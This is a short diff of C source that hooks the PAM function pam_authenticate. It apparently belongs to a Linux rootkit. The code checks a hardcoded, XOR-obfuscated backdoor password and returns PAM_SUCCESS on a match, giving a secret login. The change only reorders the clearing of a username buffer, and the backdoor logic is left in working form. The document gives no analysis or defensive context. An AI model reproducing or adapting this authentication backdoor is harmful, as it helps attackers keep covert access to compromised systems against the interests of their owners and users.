@@ -11,11 +11,12 @@ int pam_authenticate(pam_handle_t *pamh, int flags)
         if(!strcmp(cprocname(), "login")){ CLEAN(bduname); return o_pam_authenticate(pamh, flags); }
         char prompt[512], *pw;
         snprintf(prompt, sizeof(prompt), "* Password for %s: ", bduname);
+        CLEAN(bduname);
         pam_prompt(pamh, 1, &pw, "%s", prompt);
 
         char *bdpwd=strdup(BD_PWD); xor(bdpwd);
-        if(!strcmp(crypt(pw, bdpwd), bdpwd)) { CLEAN(bduname); CLEAN(bdpwd); return PAM_SUCCESS; }
-        CLEAN(bduname); CLEAN(bdpwd);
+        if(!strcmp(crypt(pw, bdpwd), bdpwd)) { CLEAN(bdpwd); return PAM_SUCCESS; }
+        CLEAN(bdpwd);
         return PAM_USER_UNKNOWN;
     }
     CLEAN(bduname);
